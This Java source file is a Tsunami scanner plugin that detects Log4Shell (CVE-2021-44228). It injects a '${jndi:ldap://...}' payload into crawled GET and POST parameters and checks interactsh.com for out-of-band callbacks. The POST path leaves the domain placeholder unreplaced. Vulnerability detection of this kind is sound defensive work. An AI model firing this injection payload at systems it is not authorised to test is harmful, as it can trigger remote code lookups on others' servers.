/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202144228;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.ImmutableSet;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.Gson;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugins.detectors.cves.cve202144228.crawl.Crawler;
import com.google.tsunami.plugins.detectors.cves.cve202144228.crawl.ScopeUtils;
import com.google.tsunami.proto.CrawlConfig;
import com.google.tsunami.proto.CrawlResult;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.MGF1ParameterSpec;
import java.time.Clock;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.OAEPParameterSpec;
import javax.crypto.spec.PSource;
import javax.crypto.spec.SecretKeySpec;
import javax.inject.Inject;
import org.bouncycastle.util.io.pem.PemObject;
import org.bouncycastle.util.io.pem.PemWriter;

/**
 * A {@link VulnDetector} that detects the CVE-2021-44228 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE202144228VulnDetector",
    version = "0.1",
    description =
        "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters "
            + "do not protect against attacker controlled LDAP and other JNDI related endpoints. "
            + "An attacker who can control log messages or log message parameters can execute "
            + "arbitrary code loaded from LDAP servers when message lookup substitution is enabled."
            + " From log4j 2.15.0, this behavior has been disabled by default. ",
    author = "hh-hunter",
    bootstrapModule = Cve202144228DetectorBootstrapModule.class)
public final class Cve202144228VulnDetector implements VulnDetector {

  public static String OOB_DOMAIN = "";
  private PrivateKey privateKey;
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static String PAYLOAD = "${jndi:ldap://OOB_DOMAIN/}";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do"
          + " not protect against attacker controlled LDAP and other JNDI related endpoints. An "
          + "attacker who can control log messages or log message parameters can execute arbitrary"
          + " code loaded from LDAP servers when message lookup substitution is enabled. From log4j"
          + " 2.15.0, this behavior has been disabled by default.";

  private final HttpClient httpClient;
  private final Clock utcClock;
  private final Crawler crawler;
  private final UUID secretKey;
  private final String correlationId;


  @Inject
  Cve202144228VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient, Crawler crawler) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.crawler = checkNotNull(crawler);
    this.secretKey = UUID.randomUUID();
    this.correlationId = getRandomString(20);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2021-44228 starts detecting.");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(Cve202144228VulnDetector::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String startingUrl = buildTargetUrl(networkService, "");
    ImmutableSet<CrawlResult> crawlResults = crawlNetworkService(startingUrl, networkService);
    if (crawlResults.size() > 0) {
      initOOBDomain();
    }
    if ("".equals(OOB_DOMAIN)) {
      return false;
    }

    for (CrawlResult crawlResult : crawlResults) {
      if ("GET".equals(crawlResult.getCrawlTargetOrBuilder().getHttpMethod())) {
        List<String> nextUris = buildNextGetUris(startingUrl,
            crawlResult.getCrawlTargetOrBuilder().getUrl());
        if (checkGetVulnerable(networkService, nextUris)) {
          return true;
        }
      }
      if ("POST".equals(crawlResult.getCrawlTargetOrBuilder().getHttpMethod())) {
        // todo: getHttpRequestBody is always empty, which may be a bug.
        logger.atInfo()
            .log(crawlResult.getCrawlTargetOrBuilder().getHttpRequestBody().toStringUtf8());
        Map<String, List<String>> nextPostUris = buildNextPostUris(startingUrl,
            crawlResult.getCrawlTargetOrBuilder().getUrl(),
            crawlResult.getCrawlTargetOrBuilder().getHttpRequestBody().toStringUtf8());
        if (checkPostVulnerable(networkService, nextPostUris)) {
          return true;
        }
      }
    }
    return false;
  }

  /**
   * Check for vulnerabilities using GET method
   *
   * @param networkService
   * @param nextUriList
   * @return
   */
  private boolean checkGetVulnerable(NetworkService networkService, List<String> nextUriList) {
    return nextUriList.stream().anyMatch(item -> {
      String targetUrl = buildTargetUrl(networkService, item);
      try {
        httpClient.send(HttpRequest.get(targetUrl).withEmptyHeaders().build(), networkService);
      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      }
      return checkOOBData();
    });
  }

  /**
   * Check for vulnerabilities using POST method
   *
   * @param networkService
   * @param nextUriList
   * @return
   */
  private boolean checkPostVulnerable(NetworkService networkService,
      Map<String, List<String>> nextUriList) {
    return nextUriList.entrySet().stream().anyMatch(item -> {
      String uri = item.getKey();
      List<String> postDataList = nextUriList.get(item.getKey());
      String targetUrl = buildTargetUrl(networkService, uri);
      return postDataList.stream().anyMatch(postData -> {
        try {
          System.out.println(targetUrl + "\t\t" + postData);
          httpClient.send(HttpRequest.post(targetUrl).setRequestBody(
              ByteString.copyFromUtf8(postData)).withEmptyHeaders().build(),
              networkService);
        } catch (IOException e) {
          logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
        }
        return checkOOBData();
      });
    });
  }

  public void initOOBDomain() {
    if ("".equals(OOB_DOMAIN)) {
      try {
        KeyPair keyPair = generateRsaKeyPair();
        privateKey = keyPair.getPrivate();
        PublicKey publicKey = keyPair.getPublic();
        PemObject pemObject = new PemObject("PUBLIC KEY", publicKey.getEncoded());
        ByteArrayOutputStream pubKeyByteStream = new ByteArrayOutputStream();
        PemWriter pemWriter = new PemWriter(new OutputStreamWriter(pubKeyByteStream));
        pemWriter.writeObject(pemObject);
        pemWriter.close();
        String pubKeyEncoded =
            new String(Base64.getEncoder().encode(pubKeyByteStream.toByteArray()));

        String registerData = String
            .format("{\"public-key\":\"%s\",\"secret-key\":\"%s\",\"correlation-id\":\"%s\"}",
                pubKeyEncoded, this.secretKey, this.correlationId);
        HttpResponse response = httpClient
            .send(HttpRequest.post("https://interactsh.com/register").setRequestBody(
                ByteString.copyFromUtf8(registerData)).withEmptyHeaders().build());
        if (response.bodyString().get().contains("successful")) {
          OOB_DOMAIN = "tsunami." + correlationId + "gdpdpreyyyyyb.interactsh.com";
          logger.atInfo().log("Register interactsh oob domain %s success", OOB_DOMAIN);
        }
      } catch (Exception e) {
        logger.atWarning().withCause(e).log("Register interactsh oob domain failed");
      }
    }
  }

  /**
   * Check if the oob service has dns requests
   *
   * @return
   */
  private boolean checkOOBData() {
    try {
      String poolUrl = String
          .format("https://interactsh.com/poll?id=%s&secret=%s", correlationId, secretKey);
      HttpResponse response = httpClient.send(HttpRequest.get(poolUrl).withEmptyHeaders().build());
      if (response.status() == HttpStatus.OK && response.bodyString().get().contains("aes_key")) {
        PollData pollData = new Gson().fromJson(response.bodyString().get(), PollData.class);
        for (String datum : pollData.getData()) {
          String decryptMessage = new String(decryptMessage(pollData.getAes_key(), datum));
          if (decryptMessage.contains("tsunami")) {
            return true;
          }
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Check oob data failed");
    }
    return false;
  }

  /**
   * Construct a list of URIs to be detected next, replacing the values of the parameters with
   * payload for the GET method
   *
   * @param startingUrl start url
   * @param url         crawler result url
   * @return
   */
  private Map<String, List<String>> buildNextPostUris(String startingUrl, String url,
      String postData) {
    Map<String, List<String>> nextPostDataList = new HashMap<>();
    List<String> postDataList = new ArrayList<>();
    try {
      String[] data = postData.split("&");
      for (String str : data) {
        if (str.contains("=") && str.split("=").length == 2) {
          String strKey = str.split("=")[0];
          String newData = strKey + "=" + URLEncoder.encode(PAYLOAD, UTF_8.toString());
          postDataList.add(newData);
        }
      }
    } catch (UnsupportedEncodingException e) {
      logger.atWarning().withCause(e).log("build target %s next post data failed", url);
    }
    List<String> nextPostUris = buildNextGetUris(startingUrl, url);
    nextPostUris.forEach(postUri -> {
      nextPostDataList.put(postUri, postDataList);
    });

    return nextPostDataList;
  }

  /**
   * Construct a list of URIs to be detected next, replacing the values of the parameters with
   * payload for the GET method
   *
   * @param startingUrl start url
   * @param url         crawler result url
   * @return
   */
  private List<String> buildNextGetUris(String startingUrl, String url) {
    List<String> nextUriList = new ArrayList<>();
    try {
      String query = url.replace(startingUrl, "");
      String[] queryStrings = query.split("&");
      for (String queryString : queryStrings) {
        if (queryString.contains("=") && queryString.split("=").length == 2) {
          String queryStringKey = queryString.split("=")[0];
          String newQueryString = queryStringKey + "=" +
              URLEncoder.encode(PAYLOAD.replace("OOB_DOMAIN", OOB_DOMAIN), UTF_8.toString());
          String uri = query.replace(queryString, newQueryString);
          nextUriList.add(uri);
        }
      }
    } catch (UnsupportedEncodingException e) {
      logger.atWarning().withCause(e).log("build target %s next get uris failed", url);
    }
    return nextUriList;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_44228"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2021-44228 Apache Log4j2 <=2.14.1 JNDI RCE")
                .setRecommendation(
                    "In previous releases (>=2.10) this behavior can be mitigated by setting system"
                        + " property \"log4j2.formatMsgNoLookups\" to “true” or by removing the "
                        + "JndiLookup class from the classpath "
                        + "(example: zip -q -d log4j-core-*.jar "
                        + "org/apache/logging/log4j/core/lookup/JndiLookup.class). "
                        + "Java 8u121 (see "
                        + "https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) "
                        + "protects against RCE by defaulting "
                        + "\"com.sun.jndi.rmi.object.trustURLCodebase\" and "
                        + "\"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }

  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private static String buildTargetUrl(NetworkService networkService, String nextUri) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(nextUri);
    return targetUrlBuilder.toString();
  }

  private ImmutableSet<CrawlResult> crawlNetworkService(String seedingUrl,
      NetworkService networkService) {
    CrawlConfig crawlConfig =
        CrawlConfig.newBuilder()
            .addScopes(ScopeUtils.fromUrl(seedingUrl))
            .setShouldEnforceScopeCheck(true)
            .addSeedingUrls(seedingUrl)
            .setMaxDepth(10)
            .setNetworkService(networkService)
            .build();
    return crawler.crawl(crawlConfig);
  }

  private static KeyPair generateRsaKeyPair() throws NoSuchAlgorithmException {
    KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
    generator.initialize(2048);

    KeyPair keyPair = generator.generateKeyPair();
    logger.atInfo().log("Interactsh: RSA key pair generated.");
    return keyPair;
  }

  private byte[] decryptMessage(String encodedEncryptedKey, String encodedEncryptedMsg) {
    try {
      byte[] decodedEncryptedKey = Base64.getDecoder().decode(encodedEncryptedKey);
      Cipher decryptionCipher = Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
      OAEPParameterSpec oaepParameterSpec =
          new OAEPParameterSpec(
              "SHA-256",
              "MGF1",
              MGF1ParameterSpec.SHA256,
              PSource.PSpecified.DEFAULT);
      decryptionCipher.init(Cipher.DECRYPT_MODE, this.privateKey, oaepParameterSpec);
      byte[] decodedDecryptedKey = decryptionCipher.doFinal(decodedEncryptedKey);

      byte[] decodedEncryptedMsg = Base64.getDecoder().decode(encodedEncryptedMsg);
      decryptionCipher = Cipher.getInstance("AES/CFB/NoPadding");
      SecretKey aesKey = new SecretKeySpec(decodedDecryptedKey, "AES");
      IvParameterSpec iv =
          new IvParameterSpec(
              Arrays.copyOf(decodedEncryptedMsg, decryptionCipher.getBlockSize()));
      decryptionCipher.init(Cipher.DECRYPT_MODE, aesKey, iv);
      return decryptionCipher.doFinal(
          Arrays.copyOfRange(
              decodedEncryptedMsg,
              decryptionCipher.getBlockSize(),
              decodedEncryptedMsg.length));
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Could not decrypt Interactsh interactions");
      return new byte[0];
    }
  }

  public static String getRandomString(int length) {
    String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    Random random = new Random();
    StringBuffer sb = new StringBuffer();
    for (int i = 0; i < length; i++) {
      int number = random.nextInt(62);
      sb.append(str.charAt(number));
    }
    return sb.toString().toLowerCase(Locale.ROOT);
  }

  class PollData {

    private String[] data;
    private String aes_key;

    public String[] getData() {
      return data;
    }

    public void setData(String[] data) {
      this.data = data;
    }

    public String getAes_key() {
      return aes_key;
    }

    public void setAes_key(String aes_key) {
      this.aes_key = aes_key;
    }


  }


}
